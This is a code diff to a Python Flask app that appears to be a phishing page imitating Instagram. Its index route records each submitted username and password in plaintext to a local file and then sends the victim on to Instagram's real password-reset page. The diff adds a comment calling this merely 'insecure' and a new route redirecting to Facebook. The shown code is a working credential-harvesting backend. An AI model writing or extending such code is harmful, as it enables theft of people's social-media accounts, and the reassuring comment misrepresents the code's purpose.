@@ -14,7 +14,7 @@ def index():
         username = request.form['username']
         password = request.form['password']
         
-        # Store credentials in a local file
+        # Store credentials in a local file (Note: This is insecure for real applications)
         with open('credentials.txt', 'a') as f:
             f.write(f"Username: {username}, Password: {password}\n")
         
@@ -22,6 +22,10 @@ def index():
         return redirect('https://www.instagram.com/accounts/password/reset/')
     
     return render_template('index.html')
+
+@app.route('/redirect_to_facebook', methods=['POST'])
+def redirect_to_facebook():
+    return redirect('https://www.facebook.com/')
 
 @app.route('/static/<path:path>')
 def send_static(path):
